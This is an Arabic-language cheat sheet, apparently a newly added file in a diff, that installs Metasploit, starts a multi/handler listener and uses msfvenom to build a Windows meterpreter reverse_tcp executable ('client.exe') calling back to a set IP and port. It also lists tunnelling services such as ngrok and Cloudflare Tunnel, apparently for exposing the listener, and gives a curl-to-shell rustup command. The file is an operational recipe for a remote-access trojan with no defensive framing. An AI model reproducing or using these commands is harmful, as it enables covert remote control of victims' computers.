@@ -1,0 +1,77 @@
+امر تثبيت:
+
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+  chmod 755 msfinstall && \
+  ./msfinstall
+
+امر فتح سرفر:
+
+msfconsole
+
+use exploit/multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+set lhost ''your ip localhost like'' set lhost 192.168.1.5
+
+set lport ''any port here like'' set lport 8080
+
+run
+
+
+
+make file payload
+
+msfvenom --list-payloads
+
+msfvenom -p ''any payload here'' -o ''any name file and in last add .exe or type program your system'' -f ''type program your system'' lhost=''here your ip localhost'' lport=''any port''
+
+like
+
+msfvenom -p windows/meterpreter/reverse_tcp -o client.exe -f exe lhost=192.168.1.5 lport=8080
+
+
+
+امر اصلاح مشكله تحديث الريست لو ظهرتلكم:
+
+RUSTUP_INIT_SKIP_PATH_CHECK=yes curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
+
+
+
+
+سرفرات ال اتكلمت عنها:
+
+
+playit.gg – خدمة تتيح لك تشغيل سيرفرات ألعاب من جهازك بدون فتح بورتات على الراوتر. playit.gg official site
+
+Ngrok – منصة معروفة لإنشاء نفق آمن يربط جهازك بالإنترنت بدون port forwarding. ngrok official site
+
+Pinggy – خدمة سهلة لإنشاء HTTP/TCP/UDP tunnels لمشاريعك أو سيرفراتك. pinggy.io official site
+
+Portmap.io – خدمة port forwarding عبر OpenVPN/SSH بدون الحاجة لــ NAT/CG‑NAT. portmap.io official site
+
+LocalXpose – أداة لإنشاء نفق يربط localhost بالعالم الخارجي بسرعة وأمان. localxpose.io official site
+
+Cloudflare Tunnel – أداة من Cloudflare لإنشاء نفق آمن لخدماتك بدون فتح بورتات، مع دعم HTTPS وConnects عبر شبكتهم العالمية. Cloudflare Tunnel docs (official)
+
+
+
+
+
+امر الغاء تثبيت ميتسبليت: 
+
+apt remove metasploit-framework -y
+sudo rm -rf /opt/metasploit-framework
+rm -rf ~/.msf4
+
+
+
+
+
+
+
+
+
+
+
+
